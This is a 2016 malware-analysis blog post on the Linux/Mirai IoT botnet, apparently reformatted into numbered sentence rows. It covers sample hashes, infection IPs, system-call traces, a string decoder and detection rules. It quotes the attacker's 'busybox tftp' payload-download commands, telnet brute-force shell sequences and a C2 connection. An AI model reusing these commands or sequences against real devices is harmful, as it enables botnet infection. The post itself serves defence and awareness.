Number,Content
Sentence 1,"mmd-0056-2016 - linux/mirai, how an old elf malcode is recycled..
our recent analysis about mirai is in here==>[link]
background
from august 4th 2016 several sysadmin friends were helping us by uploading this malware files to our dropbox."
Sentence 2,"the samples of this particular elf malware ware not easy to retrieve, there are good ones and also some broken ones, i listed in this post for the good ones only."
Sentence 3,"this threat is made by a new elf trojan backdoor which is now in on-going stage aiming iot, the name of the binary is mirai."
Sentence 4,* and is having telnet attack as main functionality to other boxes.
Sentence 5,"as i see these samples as something new, it would be good to start to write analysis for the purpose to raise awareness of this threat widely, since the attacks are actively spotted in the wild on plenty of infected iot networks."
Sentence 6,"during the checks i discussed about the threat to the engineer friends in etlabs,[links] who also detecting the same attack phenomena, and then having dialogue with our supporters who reported this threat directly too."
Sentence 7,"elf linux/mirai is currently having a very low elf/linux antivirus detection ratio, even in the architecture of x86."
Sentence 8,"the detection in vt for the collected multiplatform samples can be viewed in the several links below:
linux/mirai itw samples: [link] [link] [link] [link] [link] [link] [link] [link] [link]

the reason for the lack of detection is because of the lack of samples, which are difficult to fetch from the infected iot devices, routers, dvr or webip camera, the linux with busybox binary in embedded platform, which what this threat is aiming."
Sentence 9,"the threat information
the binaries are collected from multiple direct/indirect sources:

?"
Sentence 10,"1
2
3
4
5
6
7
mirai.arm:    elf 32-bit lsb executable, 'arm', version , statically linked, stripped
mirai.arm7:   elf 32-bit lsb executable, 'arm, eabi4' version 1 (sysv), statically linked, stripped
mirai.mips:   elf 32-bit msb executable, 'mips, mips-i' version 1 (sysv), statically linked, stripped
mirai.ppc:    elf 32-bit msb executable, 'powerpc or cisco 4500', ver 1 (sysv), statically linked, stripped
mirai.sh4:    elf 32-bit lsb executable, 'renesas sh', version 1 (sysv), statically linked, stripped
mirai.sparc:  elf 32-bit msb executable, 'sparc', version 1 (sysv), statically linked, stripped
mirai.x86:    elf 32-bit lsb executable, 'intel 80386', version 1 (sysv), statically linked, stripped
i picked up the elf binary in arm architecture for my main reversing since the it was the first elf appeared, doing the cross reference with the mips, ppc and sparc elf ones for the details."
Sentence 11,"in this case, i use plenty of usual tools, nothing fancy or special."
Sentence 12,"the hash of the linux/mirai initial binaries spotted:

?"
Sentence 13,"1
2
3
4
5
6
7
md5 ('mirai.arm')  = b98bc6ab2ed13028cd5178c422ec8dda
md5 ('mirai.arm7') = 33987c397cefc41ce5e269ad9543af4c
md5 ('mirai.mips') = 8e36a1fb6f6f718ec0b621a639437d8b
md5 ('mirai.ppc')  = e08befb4d791e8b9218020292b2fecad
md5 ('mirai.sh4')  = 030159a814a533f30a3e17fe757586e6
md5 ('mirai.sparc')= ac61ba163bffc0ec94944bb7b7bb1fcc
md5 ('mirai.x86')  = 6b7b6ee71c8338c030997d902a2fa593
thank you to a friend who helped much."
Sentence 14,these binaries were infected to the compromised linux system's ssh or telnet account (via default password flaw on specific iot aimed).
Sentence 15,"upon the shell access gained, the attacker will download the payload of this malware to the linux device by command traced like below:

?"
Sentence 16,"1
2
'busybox tftp' -r [malwarefile] -g [ipsource]
'busybox tftp' -g -l 'dvrhelper' -r [malwarefile] [ipsource]
the source of infection (by current download & connection trace)
?"
Sentence 17,"1
2
5.206.225.96 |  |49349 | 5.206.225.0/24 | dotsi | pt | tuganet.pt | dotsi unipessoal lda."
Sentence 18,151.80.99.84 | ns395732.ip-151-80-99.eu.
Sentence 19,"|16276 | 151.80.0.0/16 | ovh | fr | ovh.com | ovh sas
execution processes
in some cases of the linux/mirai infection is showing traces that the malware was executed without parameter and there are cases where the downloaded malware file(s) is deleted after execution."
Sentence 20,in this case mostly you won't get the samples unless you dump the malware process to the elf binary.
Sentence 21,this explains it is hard to get the good working samples for this new threat.
Sentence 22,"during the execution, the malware will open the /etc/watchdog file in read-write state with the command:

?"
Sentence 23,"1
open(/dev/watchdog, o_rdwr)
notes: in some newer cases the coder is adding other path of watchdog like:
?"
Sentence 24,"1
/dev/misc/watchdog
moving forward, and then linux/mirai will change the work directory to the root directory:
?"
Sentence 25,"1
chdir(/)
it uses pf_inet socket it is opening udp/53 port to access google dns server in 8.8.8.8 and established a connection."
Sentence 26,"something like the below reversed code (see the last section about skeleton reversing) is showing the following commands was executed for this part:

?"
Sentence 27,"1
connect(3, {sa_family=af_inet, sin_port=htons(53), sin_addr=inet_addr(8.8.8.8)}, 16)
the malware will detect the outbound interface and by re-using previous used socket it opens a random tcp/port to the ip address."
Sentence 28,"if the process above succeed malware will close the socket afterward
?"
Sentence 29,"1
2
getsockname(3, {sa_family=af_inet, sin_port=htons(39221), sin_addr=inet_addr(your-ip)}, [16])
close(3)
at this point the malware is performing several decoding for strings, which will be resulted in the targeted malware file name (below) and several random names.

?"
Sentence 30,"1
2
3
0xbf96daa4  0000 0000 0000 0000 0000 0000 0000  ..............
0xbf96dab2  0000 2e2f 6476 7248 656c 7065 7200  ..'/dvrhelper'."
Sentence 31,"0xbf96dac0  0000 0000 0000 0000 0000 0000 0000  ..............
the file will be the copy of the malware under /dev/."
Sentence 32,{something}/dvrhelper with piping the stdout and stderr on execution made to /dev/null (for silent mode execution).
Sentence 33,"the /etc/watchdog execution is meant for making the delay, for the malware not to perform the bad function instantly to avoid the early detection, and it just sit there and make sure the malicious opened backdoor port is up and used."
Sentence 34,"the mentioned {something} is the keyword generated by the malware, in example path: /dev/.anime/drvhelper

upon execution the malware will be self-deleted to avoid the trace, but the process is running."
Sentence 35,"in some iot that can be seen in lsof or the list to the /proc with specific pid, i.e.:

?"
Sentence 36,"1
2
/proc/{pid}/exe -> '/dev/."
Sentence 37,"{something}/dvrhelper' (deleted) 
/proc/{pid}/exe -> './{long alphabet strings}' (deleted)
in this stage, the networking process continues, the malware is opening pf_inet socket for tcp, and bind it to the specific port (not random) tcp/48101 from localhost ip address 127.0.0.1 and then starting to listen to the incoming connection:

?"
Sentence 38,"1
2
3
socket(pf_inet, sock_stream, ipproto_ip)
bind(3, {sa_family=af_inet, sin_port='htons(48101'), sin_addr=inet_addr(127.0.0.1)}, 16)
listen(3, 1)
by this stage the system-wide realtime clock will be queried (triggered by random) along with the retrieval set of pid, following by start forking, noted the following clocktest output and the stdout of null\n

?"
Sentence 39,"1
2
3
4
5
6
7
8
clock_gettime(clock_realtime, {1472261021, 649262704}."
Sentence 40,"getpid() // // see the reverse engineering part...
getppid()
clock_gettime(0x2 /* clock_???"
Sentence 41,"*/, {0, 6215000})
prctl(pr_set_name, 0xbef89752, 0xbef897b8, 0xbef897c8, 0)
write(1, null, 0)
write(1, \n, 1)
fork()
notes:
- forking always starts if infection possible."
Sentence 42,- the null\n is for the execution trace of the watchdog via execl(parse to environment in execve).
Sentence 43,then this main process will exit here.
Sentence 44,and forked to new process pid (note: if you go this far means the malware can infect your system).
Sentence 45,"for some infection case the malware is self connected to its opened tcp/48101 & will continuously looping without making any forks, in this case you won't get infection:

?"
Sentence 46,"1
connect(4, {sa_family=af_inet, sin_port=htons(48101), sin_addr=inet_addr(0.0.0.0)}, 16}
list of files will show."
Sentence 47,"it's showing the access port for the nodes.
?"
Sentence 48,"1
2
ipv4 5629  0t0  tcp 127.0.0.1:'48101 (listen)'
ipv4 5670  0t0  tcp 127.0.0.1:60254->'127.0.0.1:48101 (established)'
in the forked process, upon the attack command can be triggered, the infected device will perform connection on telnet services on other device for the abuse purpose:

?"
Sentence 49,"1
2
3
4
5
6
7
8
9
10
11
socket(pf_inet, sock_stream, ipproto_ip)
connect(6, {sa_family=af_inet, sin_port=htons(23), sin_addr=inet_addr(x.x.x.x)}, 16)
sendto(7, \377\374\1, 3, msg_nosignal, null, 0)
sendto(7, \377\374!, 3, msg_nosignal, null, 0) 
sendto(7, \377\375\1, 3, msg_nosignal, null, 0)
sendto(7, \377\375\3, 3, msg_nosignal, null, 0)
recvfrom(0, e\0\0(\276~@\0001\6t\342\305\347\335\323\300\250\262\vo0\0\26\373\334\316\244\217\3425\214."
Sentence 50,"recvfrom(0, e\0\0004>j@\0*\6\fbj\375(g\300\250\262\v\0\27\243\375p\351\2211m\4\322o..
recvfrom(0, e\0\0(\276\177@\0001\6t\341\305\347\335\323\300\250\262\vo0\0\26\373\334\316\244\217\3425\344..
recvfrom(0, e\0\0(\276\200@\0001\6t\340\305\347\335\323\300\250\262\vo0\0\26\373\334\316\244\217\3426,..
recvfrom(0, e\0\0,\0\0@\0.\6\216=i\213\2p\300\250\262\v\0\27\311gh\31\23\320i\213\2q."
Sentence 51,"and doing the backdoor to connect via http on 65.222.202.53.
?"
Sentence 52,"1
connect(0, {sa_family=af_inet, sin_port=htons(80), sin_addr=inet_addr(65.222.202.53)}, 16)
mitigation method of linux/mirai infection
picking a right elf is important..

you'll find so little indicator and some encoded strings in the arm binary."
Sentence 53,but there is no problem.
Sentence 54,"first you should pick the clean elf, it has the characteristic like the below:

?"
Sentence 55,"1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
elf header:
  magic:   7f 45 4c 46 01 01 01 61 00 00 00 00 00 00 00 00
  class:                             elf32
  data:                              2's complement, little endian
  version:                           1 (current)
  os/abi:                            arm
  abi version:                       0
  type:                              exec (executable file)
  machine:                           arm
 
program headers:
  type           offset   virtaddr   physaddr   filesiz memsiz  flg align
  load           0x000000 0x00008000 0x00008000 0x0dbb4 0x0dbb4 r e 0x8000
  load           0x00e004 0x0001e004 0x0001e004 0x001d4 0x05a84 rw  0x8000
  gnu_stack      0x000000 0x00000000 0x00000000 0x00000 0x00000 rwe 0x4
 
section to segment mapping:
  segment sections...
   00     .init .text .fini .rodata
   01     .ctors .dtors .data .bss
that's it for the available header & sections reading."
Sentence 56,"from each of linux.mirai elf file clean state like above, it has significant strings that can be filtered by signatures:

?"
Sentence 57,"1
2
3
4
5
6
7
8
9
10
/dev/watchdog
'lcogqgptgp'
/proc/stat
/proc/cpuinfo
processor
/sys/devices/system/cpu
enter
ogin
assword
/dev/null
if you are in the linux box, non dvr or busybox iot type, secure the access to the below stated directory too..if came up from any unknown executables."
Sentence 58,"it is also a good hazard to kill the chain of infection:

in rare occasion for infection of linux/mirai will connect you back to this mud game site, blocking its ip is good for protection:

↑the site is showing the asciiart mirai logo."
Sentence 59,↓anybody's home??
Sentence 60,"this mud-like interface is later on known as mirai botnet cnc cli panel, thank's richard:



blocking the used tcp/48101 port if you don't use it, it's good to prevent infection & further damage:

?"
Sentence 61,"1
2
mirai 29557 toor 3u  ipv4  386807  0t0  tcp 127.0.0.1:48101 (listen)
mirai 29557 toor 4u  ipv4  504795  0t0  tcp 127.0.0.1:44424->127.0.0.1:48101 (established)
the other method is to secure your busybox execution to be run only on specific user."
Sentence 62,"you'll need shell access for this operation, along with other hardening methods."
Sentence 63,"the most important thing to prevent the infection is: if you have an iot device, please make sure you have no telnet service open and running."
Sentence 64,"botnet protocol used for infection via telnet service
this explanation exists because of there are two good persons are supporting effort to crack it: special thank's to waldo kitty & @node5."
Sentence 65,what i am explaining here is the telnet scanner function that is used by attacker using the linux/mirai client version to get the installation of this malware in other node with accessible telnetd.
Sentence 66,"during the telnet session, linux/mirai attacker will communicate with its target with specific protocol."
Sentence 67,"please see the illustration below for getting the idea of what will be explained in the next writing:

the username and passwords mentioned in the figure are used for login bruting, and is hardcoded in the binary of linux/mirai, along with the commands used for the gaining the shell."
Sentence 68,"the botnet will communicate to the remote access (assuming server) who request the same strings sent, with the report in cnc callback, with the specific keyword."
Sentence 69,"after gaining shell access, the malware sends the shell one-liner command to install malware with the format as below:

this command is also hardcoded."
Sentence 70,it explained why we can not find the samples in the current infected systems since the malware file downloaded will be deleted after the execution.
Sentence 71,"the possible sequence of the attack commands can be shown as below variations:

?"
Sentence 72,"1
2
3
4
5
6
{username}
{passwords}
shell
enable
sh
/bin/busybox mirai
or, the combination below:
?"
Sentence 73,"1
2
3
4
5
6
7
{username}
{passwords}
enable
system
shell
sh
bin/busybox mirai
the reversing snips for this infection protocol can be read in skeleton reversing section."
Sentence 74,"reversing linux/mirai (stripped arm) in binary (raw) way
the binary is reversible, but it's a bit heavily stripped and has double function for decoders, so it is not that easy to read, but it's fine."
Sentence 75,"you'll see some important artifacts like these case-switch they coded to perform attack:


if you trace it carefully all of origin for strings used in encoded binary can be read like this:


decoder

?"
Sentence 76,"1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
// just to get the idea...what is cracked..
 
  fn.0x0000f9e8(var3,  (int)\rrpma\r\, 7);
  fn.0x0000f9e8(var4,  (int)\rgzg\, 5);
  fn.0x0000f9e8(var7,  (int)jvvrdnmmf\, 10);
  fn.0x0000f9e8(var8,  (int)nmnlmevdm\, 10);
  fn.0x0000f9e8(var10, (int)xmnncpf\, 8);
  fn.0x0000f9e8(var11, (int)egvnmacnkr\, 11);
  fn.0x0000f9e8(var14, (int)qjgnn\, 6);
  fn.0x0000f9e8(var15, (int)glc@ng\, 7);
  fn.0x0000f9e8(var16, (int)q[qvgo\, 7);
       :
  fn.0x0000f9e8(var17, (int)qj\, 3);
  fn.0x0000f9e8(var20, (int)lamppgav\, 9);
 
// one decoder in fn.0x0000f9e8
 
|           0x0000f9e8      000052e3       cmp r2, 0
|           0x0000f9ec      0ef0a001       moveq pc, lr
|           0x0000f9f0      00c0a0e3       mov ip, 0
|           ; jmp xref from 0x0000fa04 (fcn.0000f9e8)
|       .-> 0x0000f9f4      0130d1e4       ldrb r3, [r1], 1
|       |   0x0000f9f8      0030cce7       strb r3, [ip, r0]
|       |   0x0000f9fc      01c08ce2       add ip, ip, 1
|       |   0x0000fa00      02005ce1       cmp ip, r2
|       `=< 0x0000fa04      faffff1a       bne 0xf9f4
\           0x0000fa08      0ef0a0e1       mov pc, lr
so the usual reversing method can be done to this elf malware with using any of your flavor reversing tool that can support elf reading in little endian."
Sentence 77,"(well, by know you all know what our chosen reversing tool is)."
Sentence 78,"i will not say much about this, since all of the previous posts are showing much of this method, but let me explain a new method with the details in the next section."
Sentence 79,"reversing linux/mirai (stripped arm) on skeleton tool
i've been working with my personal project called skeleton for some time, it was started since the elf workshop of malwaremustdie started in here, tokyo, japan during avtokyo conference last year."
Sentence 80,with the goal to be an open source project (currently still in private for some hiccups core development).
Sentence 81,"the tool is having all practical necessity i need during analyzing a new unknown elf malware, to save my time a lot to focus on the core of codes and source of the threat."
Sentence 82,"for the rce itself, skeleton can be used to form the elf binary into as close as possible to the original state."
Sentence 83,"if a known binary is analyzed by skeleton, it's not interesting and that's not the point of this tool."
Sentence 84,"skeleton is showing its advantages when you push the unknown elf into it, so this arm binary is a good chance to test it :-)."
Sentence 85,"firstly, the simple explanation of skeleton concept can be seen in the figure below, a self-explanatory:


skeleton concept is analyzing the all malware libraries you collected (all vectors related information of one family of malware) in the database, and is checking the new analyzed binary by firstly checking calls made on the sample..just like when you trace a syscalls..but with additional of the known function too are stored in malcode dataset."
Sentence 86,"for example, in this linux/mirai this is the statistic of used syscall (this is only the example, using a very well known command):


then the tool is parsed by radare2 assembly dump of the malware, in the form like in the below picture's shown:

..and after some process (sorry that i can not say openly here), receiving a not-bad reversing output in the c-like (not c++)."
Sentence 87,the result is not 100% looks like the original source code.
Sentence 88,"specially if you are reversing this from arm processor which many variable declaration will be passed more steps through registers than intel, but it will get you into an idea of what kind of code that's actually responsible for this badness."
Sentence 89,"the code generated by this scheme is making a basic concept code of what the actual source code is, why i called it as skeleton."
Sentence 90,"ps: radare is the best tool for rce in this planet, me and mmd team are proud to use it for so long."
Sentence 91,..and i was not surprised when i saw that elf linux/mirai was actually showing many part of codes as similar as gayfgt/torlus/lizkebab or bash0day/bashdoor/bashlite.
Sentence 92,"reference about gayfgt/torlus/lizkebab [link]

below are screenshots of view of skeleton rce tool results (after being beautified) by analyzing linux/mirai malware:

the cracked functions:


putting all together in the main() :)


the case-switch used for abuse action (attack, etc) trigger, looks like the coding style of torlus/gayfgt re-coded version to me..


obviously same style of coding too :-) some strings are automatic input by skeleton as suggestion since the system found the code matched."
Sentence 93,"another encoded strings blob and path to its decoder addresses:


snips of skeleton reversing on the malware's telnet scanning protocol

this part can not be done well w/o cool help from waldokitty."
Sentence 94,"not every information will be published, it is posted in enough level to poc the threat and its origin."
Sentence 95,"the telnet login command grepped by the linux/mirai from skeleton c code:


the password request of the telnet login grepped:


how the user & password is sent, one at the time..


attempt to gain the shell...studied from several collected bins


how the injected code is formed and sent...in rough code."
Sentence 96,this will be followed by the fetch malware command described in the telnet attack protocol section.
Sentence 97,"if you see the above telnet infection generated reversed codes of linux/mirai, except for the usage of encoded strings and some additional/modification in injected telnet commands, it is reminding us for the previous known malware threat that aimed telnet and iot/routers created by the skiddos we posted before."
Sentence 98,they don't (or maybe just can't) do much modification for the telnet scanner part.
Sentence 99,"despite similarity in the telnet infection, there are some interesting functions can be seen in the malware attack action that's not found in the previous threat, please take a rain check for those, for the current security reason."
Sentence 100,"about further information on the telnet scannning research from the overall infected iot device i can recommend you a very good report on telnet honeypot written by mr. bedřich košata in cz.nic [link]


notes for skeleton reversed code:

the thing about reverse engineering is, you always can sense same stuff coded from someone or from the threat you follow."
Sentence 101,"the generated code is not 100% same as the original source used, but it is enough to give is idea about how it works in more details and how it was coded."
Sentence 102,"in this reversing i am using the one several arm samples in 32bit as main reference, which is influencing the distortion in code generated (to be more using more variables and registers than intel)."
Sentence 103,i will brush-up these codes in my spare time.
Sentence 104,"the conclusion
elf linux/mirai is the next generation of what they called it as gayfgt/lizkebab/torlus or what we call it as bash0day, bashdoor, or bashlite in the past."
Sentence 105,which is desigend to be more sophisticated in aiming linux boxes in internet for the botnet purpose (obviously for the ddos attack cannons).
Sentence 106,"this malware is designed scan the telnet service running device and to own them, the owned/infected nodes are used for the cushion for further hacks."
Sentence 107,"by product types, elf linux/mirai is targeting dvr (hint /dvrhelper), webip camera on busybox, other busybox powered linux iot boxes, and unattended linux servers."
Sentence 108,"the only significant addition is the stripping combined with encoded strings, thus added with busybox/watchdog delay, with other diversion in confusing the traffic filtration."
Sentence 109,"the delay in activation of the malware and the cnc different port used is not changing the basic of communication protocol of what previous malware has coded with, the malware is depending by the remote access to operate further."
Sentence 110,"the same group of skiddo actors who use torlus or gayfgt are the one who responsible for this malware, facts are supporting this assumption with the same attack m.o (via telnet service and telnet scanners), youth hacktivism involved, same trace of coding style, infection style via /dev with deletion, and so on."
Sentence 111,it's too obvious.
Sentence 112,not necessarily from the same coder but the gayfgt/torlus shared code was re-used.
Sentence 113,"linux with architecture x86-32 is not their priority, this is why i don't see much of it but focus on samples that are really hitting the devices (mostly are arm samples), the other is fetched from infection data or by tracking back to its sources..
the traffic filtration for this threat is provided thoroughly by ids/ips filtration by et labs good folks [link], kudos hard working engineers to share the open rules to filter this planet from this threat attacks."
Sentence 114,"if your traffic filtration showed the below indicators, please make sure that you have no open telnet service to be aimed by the attackers.
?"
Sentence 115,"1
2
3
4
5
open rules:
  2023016 - et telnet suspicious path to busybox
  2023017 - et telnet suspicious busybox shell
  2023018 - et telnet suspicious busybox enable
  2023019 - et telnet busybox mirai hackers - possible brute force attack
mr. johnny vestergaard from honeynet project norwegian chapter is releasing report about the recent attempt to hack his honeypots, and linux/mirai attacks were recorded in the same period [link]
ah, one last thing... we still have a better kungfu, kiddos!"
Sentence 116,":)

thank you and epilogue
to all of the good sysadmin friends who uploaded us the samples."
Sentence 117,to engineer friends in et labs for the nice discussion about the threat.
Sentence 118,to security ring in mmd and my country who support to our elf research.
Sentence 119,"to the friends who contacted us directly and doing the very best cooperation to share and explain the threat..even-though it was hard to fetch some binaries from the memory but you all did it, we thank you for the hard work and support to make this analysis is possible."
Sentence 120,i will continue the development of the skeleton tool to be more presentable and used by good people who want to dissect the unknown binary by this method.
Sentence 121,at the moment i will try to sync the skeleton development plan to be presented in public for the near future.
Sentence 122,please contact @unixfreaxjp for the development matters.
Sentence 123,"the moral of the story of this threat ; this is the example, on how a group of bad hackers can improve themselves.. if we let them still be freely doing their vandalism act out there."
Sentence 124,they keep on improving their threat and they have no care to aim anything that can be infected to expand their botnets.
Sentence 125,"don't let the young age reducing our priority to stop the actors in the legal way, juveniles scheme in our culture are there for them to taste the consequences of what they do in the real life., let them taste it."
Sentence 126,if we don't stop them now..think about what they can do for 5 or 10 years from now to our internet.
Sentence 127,to have linux boxes in iot to support our present life aspects is a bless in our technology era.
Sentence 128,but please be parallel to serve those boxes with more presentable security settings and don't let the authentication security for those running 365/24/7 os becomes obsolete.
Sentence 129,apply some securing method to secure it better too in user land ui i.e.
Sentence 130,": to force users to change the factory setting passwords before using them, or not to let telnetd runs openly by default, ask the users not to serve ssh in the default ports of possible, and these are really helping to reduce this threat hitting networks that is having much iot running."
Sentence 131,"feel free to contact us in @malwaremustdie (twitter/direct message), or by comments to this post if you have an infection for this malware and look for advisory to dissect it, or to dump the sample from your busybox/iot."
Sentence 132,"thank you very much for the internet media awareness
we, mmd thank our good friends in internet media for your fast awareness of this threat:
1. security affairs (interview report) [link]
2. security week [link]
3. softpedia [link]
4. open source forum .ru [link]
5. bug online .hr [link]
6. muy seguridad .es [link]
7. ipsinfo."
Sentence 133,"ru [link]
8. articulos relacionados con el mundo de la tecnologia .es [link]
9."
Sentence 134,"甄选微信朋友圈热门文章_微信热文 .cn [link]
10. info security magazine .nl [link]
11. helpnet security [link]
12. best security search [link]
13."
Sentence 135,"老蔡博客 | 专注云计算运维自动化 .cn [link]
14. it vesti (bosnian) [link]
15. heise security .de [link]
16. slashdot.org [link]
..and others who are not mentioned yet (i am sorry!)"
Sentence 136,stay safe folks!
Sentence 137,#malwaremustdie!
Sentence 138,"reversed, analyzed and written by @unixfreaxjp [link], august 31st 2016.

posted by unixfreaxjp at thursday, september 01, 2016"
